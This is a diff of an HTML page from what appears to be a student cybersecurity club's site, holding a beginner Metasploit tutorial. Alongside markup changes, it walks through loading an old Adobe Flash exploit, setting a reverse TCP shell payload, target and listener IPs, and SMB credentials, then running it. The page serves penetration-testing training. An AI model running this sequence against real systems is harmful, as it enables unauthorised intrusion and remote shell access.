@@ -1,10 +1,10 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
-
-    <!-- Start of head section -->
-    <head>
-    <!-- Basic Page Needs -->
+<!-- Start of head section -->
+<head>
+    <!-- Basic page meeds -->
     <meta charset="utf-8" />
+    <!-- Title for top of page -->
     <title>MGA Cyberknights | Metasploit</title>
     <!-- Font section -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -18,202 +18,244 @@
     <!-- StyleSheet Reference section -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <!-- Reference for "style.css" within current directory -->
     <link href="style.css" rel="stylesheet" />
-    <!-- Script for potential IE user -->
+
+    <!-- Script for potential IE user to prevent site not working on IE 9 -->
     <!--[if lt IE 9]>
     <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
     <![endif]-->
-
 </head> <!-- End of head section -->
-    <!-- Tag for Top of Page Link -->
-    <a id="top"></a>
-    <header>
-        <div class="headerContent">
-            <img id="KnightsLogo" src="images/CyberknightsLogo.png" alt="MGA Cyberknights Logo" />
-            </a>
-            <h1>
-                MGA
-            </h1>
-            <br />
-            <h1>
-                Cyberknights
-            </h1>
-            
-        </div>
-    </header>
-    <!-- Start of navbar section -->
-    <div class="navbar">
-        <!--Home Page-->
-        <a id="homeBtn" href="index.html">Home</a>
-        <div class="subnav">
-            <button class="subnavbtn">
-                <!--Events subnav section-->
-                Events <i class="fa fa-caret-down"></i>
-            </button>
-            <div class="subnav-content">
-                <a href="calendar.html">Calendar</a>
-                |
-                <a href="event-highlights.html">Event Highlights</a>
-            </div>
-        </div> <!-- End of Events subnav section -->
-        <div class="subnav">
-            <!--Training subnav section-->
-            <button class="subnavbtn">
-                Training <i class="fa fa-caret-down"></i>
-            </button>
-            <div class="subnav-content">
-                <a href="ctf-training.html">CTF Challenges</a>
-                |
-                <a href="the-armory.html">The Armory</a>
-            </div>
-        </div> <!-- End of Training subnav section -->
-        <div class="subnav">
-            <!--About Us subnav section-->
-            <button class="subnavbtn">
-                About Us <i class="fa fa-caret-down"></i>
-            </button>
-            <div class="subnav-content">
-                <a href="about-us.html">About Us</a>
-                |
-                <a href="membership.html">Membership</a>
-            </div>
-        </div> <!-- End of Training subnav section -->
-       <div class="subnav">
-            <!--Contact Us subnav section-->
-            <a id="homeBtn" href="contact-us.html">Contact Us</a>
-      
-        </div> <!-- End of Contact Us subnav section -->
-    </div> <!-- End of navbar section -->
-    <!-- Start of main section -->
-    <main>
+<!-- Tag for Top of Page Link -->
+<a id="top"></a>
+<header>
+    <!-- Header content including the logo and MGA Cyberknights title located at the top of each page -->
+    <div class="headerContent">
+        <img class="KnightsLogo" src="images/CyberknightsLogo.png" alt="MGA Cyberknights Logo" />
+        <img class="MGATitle" src="images/mgacyber.png" alt="MGA Cyberknights" />
+    </div>
+</header> <!-- End of header section -->
+<!-- Start of navbar section -->
+<nav class="navbar">
+    <!-- Code to help separate the navbar links -->
+    <div class="menu-tab">Menu</div>
+    <a href="#" class="toggle-button">
+        <span class="bar"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+    </a>
+    <!-- Navbar page links -->
+    <div class="navbar-links">
+        <ul>
+            <!-- Home page link -->
+            <li><a href="index.html">Home</a></li>
+            <!-- Events subnav section -->
+            <li>
+                <div class="subnav">
+                    <button class="subnavbtn">
+                        Events <i class="fa fa-caret-down"></i>
+                    </button>
+                    <div class="subnav-content">
+                        <!-- Calendar page link -->
+                        <a href="calendar.html"><img src="images/arrow-icon.png" alt="nav-arrow" />Calendar</a>
+                        <br />
+                        <!-- Event Highlights page link -->
+                        <a href="event-highlights.html"><img src="images/arrow-icon.png" alt="nav-arrow" />Highlights</a>
+                    </div>
+                </div>
+            </li> <!-- End of Events subnav section -->
+            <!-- Training subnav section -->
+            <li>
+                <div class="subnav">
+                    <button class="subnavbtn">
+                        Training <i class="fa fa-caret-down"></i>
+                    </button>
+                    <div class="subnav-content">
+                        <!-- CTF Challenges page link -->
+                        <a href="ctf-training.html"><img src="images/arrow-icon.png" alt="nav-arrow" />CTF Challenges</a>
+                        <br />
+                        <!-- The Armory page link -->
+                        <a href="the-armory.html"><img src="images/arrow-icon.png" alt="nav-arrow" />The Armory</a>
+                    </div>
+                </div>
+            </li> <!-- End of Training subnav section -->
+            <!-- About Us subnav section -->
+            <li>
+                <div class="subnav">
+                    <button class="subnavbtn">
+                        About Us <i class="fa fa-caret-down"></i>
+                    </button>
+                    <div class="subnav-content">
+                        <!-- About Us page link -->
+                        <a href="about-us.html"><img src="images/arrow-icon.png" alt="nav-arrow" />About Us</a>
+                        <br />
+                        <!-- Membership page link -->
+                        <a href="membership.html"><img src="images/arrow-icon.png" alt="nav-arrow" />Membership</a>
+                    </div>
+                </div>
+            </li> <!-- End of About Us subnav section -->
+            <!-- Contact Us page link -->
+            <li><a href="contact-us.html">Contact Us</a></li>
+        </ul>
+    </div> <!-- End of Navbar page links -->
+</nav> <!-- End of navbar section -->
+<!-- Start of main section -->
+<main>
     <!-- Start of wrapper section -->
-        <div class="wrapper">
+    <div class="wrapper">
         <!-- Start of pageContent section -->
-            <div class="pageContent">
+        <div class="pageContent">
             <!-- TEAM2 NOTES== Insert all page content within this section -->
             <br /><br />
-
             <h2>
                 Metasploit Basics
             </h2>
-
             <p class="metasploit-content">
-                Metasploit is a penetration testing tool and is often listed as the world’s most widely used pen-testing tool. 
-                There is a free version but with limited features. The pro version starts at $5,000 with full features starting at $15,000 per year. 
-                In simple terms, Metasploit makes hacking easier. It offers a command-line interface, but the GUI-based version is available in the Pro version. 
-                It offers a PS Exec feature that can kill a process from another computer to one that is frozen. 
-                It integrates with Nmap, SNMP scanning, and Windows patch enumeration and most reconnaissance tools integrate with Metasploit. 
-                Metasploit includes a massive database with exploits that will work to crack open a system weakness. 
-                It also has tools that help with privilege escalation, pass the hash, pivoting tools, packet sniffing, keyloggers, and screen capture among many more features. 
+                Metasploit is a penetration testing tool and is often listed as the world’s most widely used pen-testing tool.
+                There is a free version but with limited features. The pro version starts at $5,000 with full features starting at $15,000 per year.
+                In simple terms, Metasploit makes hacking easier. It offers a command-line interface, but the GUI-based version is available in the Pro version.
+                It offers a PS Exec feature that can kill a process from another computer to one that is frozen.
+                It integrates with Nmap, SNMP scanning, and Windows patch enumeration and most reconnaissance tools integrate with Metasploit.
+                Metasploit includes a massive database with exploits that will work to crack open a system weakness.
+                It also has tools that help with privilege escalation, pass the hash, pivoting tools, packet sniffing, keyloggers, and screen capture among many more features.
                 Metasploit can also be modified to the user's needs. It is a total package solution.
             </p>
-
             <h1>
                 How to use Metasploit
             </h1>
-
             <p class="metasploit-title">
                 Show
             </p>
             <p>The Show command can be used to see items within a module.</p>
             <p>For example:</p>
-            <li>msf > show auxiliary</li>
+            <ul>
+                <li>msf > show auxiliary</li>
+            </ul>
             <p>The above command will show the available auxiliary modules.</p>
             <p class="metasploit-title">
                 Loading a Module
             </p>
             <p>Example:</p>
-            <li>msf > use priv</li>
+            <ul>
+                <li>msf > use priv</li>
+            </ul>
             <p>The above command will use the priv module.</p>
             <p class="metasploit-title">
                 Setting Options
             </p>
             <p>Example:</p>
-            <li>msf > set [option] [Value]</li>
-            <li>msf > show options</li>
+            <ul>
+                <li>msf > set [option] [Value]</li>
+                <li>msf > show options</li>
+            </ul>
             <p>In the two above commands, the first command is used to set options and the second can be used to see what options are available in the current module.</p>
             <p class="metasploit-title">
                 Executing an Exploit
             </p>
             <p>The exploit must first be loaded, for example:</p>
-            <li>msf > use exploit/windows/browser/adobe_flash_avm2</li>
-            <p>The above command sets the exploit to be used to a vulnerability found in an older version of Adobe Flash. 
-                The vulnerability has been patched; however, if a patch has not been applied, it could be used to exploit the target system.</p>
+            <ul>
+                <li>msf > use exploit/windows/browser/adobe_flash_avm2</li>
+            </ul>
+            <p>
+                The above command sets the exploit to be used to a vulnerability found in an older version of Adobe Flash.
+                The vulnerability has been patched; however, if a patch has not been applied, it could be used to exploit the target system.
+            </p>
             <p>To see information about the vulnerability the below command can be used:</p>
-            <li>msf exploit(adobe_flash_avm2) > info</li><br />
+            <ul>
+                <li>msf exploit(adobe_flash_avm2) > info</li>
+            </ul>
+            <br />
             <p>Help command within and exploit will give a list of available commands:</p>
-            <li>msf exploit(adobe_flash_avm2) > help</li><br />
+            <ul><li>msf exploit(adobe_flash_avm2) > help</li></ul><br />
             <p>Loading the exploit does nothing to the target. A payload must be used to exploit the vulnerability. To see the available payloads, use this command:</p>
-            <li>msf exploit(adobe_flash_avm2) > show payloads</li><br />
+            <ul><li>msf exploit(adobe_flash_avm2) > show payloads</li></ul><br />
             <p>After reviewing the payloads and finding the right one, use this command:</p>
-            <li>msf exploit(adobe_flash_avm2) > set PAYLOAD [copy and paste the payload from the payload list]</li><br />
+            <ul><li>msf exploit(adobe_flash_avm2) > set PAYLOAD [copy and paste the payload from the payload list]</li></ul><br />
             <p>Example:</p>
-            <li>msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</li>
+            <ul><li>msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</li></ul><br />
             <p>The credentials of the target must also be set. The entire command settings to make the exploit happen may look like this example:</p>
-            <p class="NoBullet-list">
-            <ol>1. msf > use exploit/windows/browser/adobe_flash_avm2</ol>
-            <ol>2. msf exploit(adobe_flash_avm2) > set RHOST 192.168.1.100</ol>
-            <ol>3. msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</ol>
-            <ol>4. msf exploit(adobe_flash_avm2) > set LHOST 192.168.1.4</ol>
-            <ol>5. msf exploit(adobe_flash_avm2) > set LPORT 4444</ol>
-            <ol>6. msf exploit(adobe_flash_avm2) > set SMBUSER Admin</ol>
-            <ol>7. msf exploit(adobe_flash_avm2) > set SMBPASS Admin</ol>
-            <ol>8. msf exploit(adobe_flash_avm2) > exploit</ol>
+            <div class="NoBullet-list">
+                <ul>
+                    <li>1. msf > use exploit/windows/browser/adobe_flash_avm2</li>
+                    <li>2. msf exploit(adobe_flash_avm2) > set RHOST 192.168.1.100</li>
+                    <li>3. msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp</li>
+                    <li>4. msf exploit(adobe_flash_avm2) > set LHOST 192.168.1.4</li>
+                    <li>5. msf exploit(adobe_flash_avm2) > set LPORT 4444</li>
+                    <li>6. msf exploit(adobe_flash_avm2) > set SMBUSER Admin</li>
+                    <li>7. msf exploit(adobe_flash_avm2) > set SMBPASS Admin</li>
+                    <li>8. msf exploit(adobe_flash_avm2) > exploit</li>
+                </ul>
+            </div>
 
             <p>The previous commands do the following:</p>
-
-            <ol>1. Selects the exploit to use</ol>
-            <ol>2. Sets the remote host IP</ol>
-            <ol>3. Sets the payload</ol>
-            <ol>4. Sets the local host IP</ol>
-            <ol>5. Sets the port number</ol>
-            <ol>6. Sets the username</ol>
-            <ol>7. Sets the users password</ol>
-            <ol>8. Executes the commands</ol>
-            </p><br />
+            <ul>
+                <li>1. Selects the exploit to use</li>
+                <li>2. Sets the remote host IP</li>
+                <li>3. Sets the payload</li>
+                <li>4. Sets the local host IP</li>
+                <li>5. Sets the port number</li>
+                <li>6. Sets the username</li>
+                <li>7. Sets the users password</li>
+                <li>8. Executes the commands</li>
+            </ul>
+            <br />
             <h2>Video Resources</h2>
             <p class="Large-Font">
                 What is Metasploit - Metasploit Minute
             </p>
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/TCPyoWHy4eA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/TCPyoWHy4eA" title="YouTube video player"></iframe>
             <p class="Large-Font">
                 Metasploit for Beginners - #1 The Basics - Modules, Exploits & Payloads (This is the first of a four-part tutorial)
             </p>
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/8lR27r8Y_ik" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/8lR27r8Y_ik" title="YouTube video player"></iframe>
             <p class="Large-Font">
                 Complete Metasploit System Hacking Tutorial!
             </p>
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/_C7nRJ6WsmI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/_C7nRJ6WsmI" title="YouTube video player"></iframe>
             <p>
                 Additional Resources
             </p>
-            <li><a href="https://www.metasploit.com/">Metasploit Home Page</a></li>
-            <li><a href="https://www.csoonline.com/article/3379117/what-is-metasploit-and-how-to-use-this-popular-hacking-tool.html">CSO: What is Metasploit and how to use this popular hacking tool</a></li>
-            <li><a href="https://www.upguard.com/blog/core-security-vs-rapid7">Upguard: Core security vs Rapid7 for Continuous Security</a></li>
-            
-            
-            
+            <ul>
+                <li><a href="https://www.metasploit.com/">Metasploit Home Page</a></li>
+                <li><a href="https://www.csoonline.com/article/3379117/what-is-metasploit-and-how-to-use-this-popular-hacking-tool.html">CSO: What is Metasploit and how to use this popular hacking tool</a></li>
+                <li><a href="https://www.upguard.com/blog/core-security-vs-rapid7">Upguard: Core security vs Rapid7 for Continuous Security</a></li>
+            </ul>
             <br />
-
-     
-        </div>
-          <br><hr id="divider1"><br>
-                <h1 class="cybersecurity-content">            
+            <br><hr><br>
+            <ul class="cybersecurity-content">
                 <li><a href="the-armory.html">The Armory</a></li>
                 <li><a href="MSFVENOM.html">MSFvenom</a></li>
                 <li><a href="PIVOTING.html">Pivoting</a></li>
                 <li><a href="POST-EXPLOITATING.html">Post-Exploitation</a></li>
-
-            </h1>
-
-            <footer>
-                <br><hr id="divider1"><br>
-                <a id="back-to-top" href="#top">Back to Top</a>
-                <br>
-                <!-- Copywrite Tags and links for the Terms of Use and Privacy Policy page links-->
-                <h3 class="copywrite">&copy; SC - Team 2<br />2022</h3>
-                <a href="terms-of-use.html">Terms of Use</a> | <a href="privacy-policy.html">Privacy Policy</a>
-            </footer>
-        </div> <!-- End of wrapper section -->
-    </main> <!-- End of main section -->
+            </ul>
+        </div> <!-- End of pageContent section -->
+        <!--Start of script section-->
+        <div class="scripts">
+            <script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+            <script src="./Darkmode.js"></script>
+        </div> <!-- End of script section -->
+        <!-- Start of footer -->
+        <footer>
+            <br><hr id="divider1"><br>
+            <!-- Link to bring user back-to-top of page -->
+            <a id="back-to-top" href="#top">Back to Top</a>
+            <br>
+            <!-- Link to the MGA School of Information technology Facebook page -->
+            <a href="https://www.facebook.com/mgainfotech" target="_blank">
+                <span id="facebookLogo">
+                    <img src="images/facebook-logo.png" alt="Facebook logo">
+                </span>
+            </a>
+            <!-- Link to the official MGA website -->
+            <a id="mgaLogo" href="https://www.mga.edu/index.php" target="_blank">
+                <img src="images/logo.jpg" alt="MGA Logo">
+            </a>
+            <br />
+            <!-- Link to the Terms-of-Use and the Privacy-Policy pages -->
+            <a href="terms-of-use.html">Terms of Use</a> | <a href="privacy-policy.html">Privacy Policy</a>
+        </footer> <!-- End of the footer-->
+    </div> <!-- End of wrapper section -->
+</main> <!-- End of main section -->
 </html>
